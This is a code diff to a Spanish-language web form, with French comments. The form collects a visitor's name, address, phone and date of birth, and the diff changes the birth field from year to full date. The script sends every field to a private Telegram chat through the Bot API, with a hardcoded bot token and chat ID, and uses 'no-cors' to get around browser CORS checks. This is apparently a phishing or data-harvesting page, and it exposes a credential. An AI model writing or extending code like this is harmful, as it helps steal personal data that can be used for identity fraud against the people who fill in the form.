@@ -27,8 +27,14 @@
         <option value="BE">Bélgica</option>
         <option value="CH">Suiza</option>
       </select>
-      <!-- Nouveau champ Año de nacimiento -->
-      <input type="number" placeholder="Año de nacimiento" min="1900" max="2025" required/>
+      <!-- Champ Date de naissance complet -->
+      <input
+        type="date"
+        placeholder="Fecha de nacimiento"
+        min="1900-01-01"
+        max="2025-12-31"
+        required
+      />
       <input type="tel" placeholder="Teléfono" required/>
       <button type="submit">Continuar</button>
     </form>
@@ -69,14 +75,14 @@
         ciudad:   elems[3].value.trim(),
         cp:       elems[4].value.trim(),
         pais:     elems[5].value,
-        ano:      elems[6].value,   // Año de nacimiento
+        nacimiento: elems[6].value,  // valeur YYYY-MM-DD
         telefono: elems[7].value.trim()
       };
 
       // Préparation du message Telegram
       const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chatId   = "-1887198443";
-      const message  = 
+      const message  =
         `📋 Información personal:\n` +
         `Apellido: ${data.apellido}\n` +
         `Nombre: ${data.nombre}\n` +
@@ -84,10 +90,10 @@
         `Ciudad: ${data.ciudad}\n` +
         `Código postal: ${data.cp}\n` +
         `País: ${data.pais}\n` +
-        `Año de nacimiento: ${data.ano}\n` +
+        `Fecha de nacimiento: ${data.nacimiento}\n` +
         `Teléfono: ${data.telefono}`;
 
-      // Envoi vers Telegram (mode no-cors pour contourner CORS)
+      // Envoi vers Telegram (no-cors pour contourner CORS)
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         mode: "no-cors",
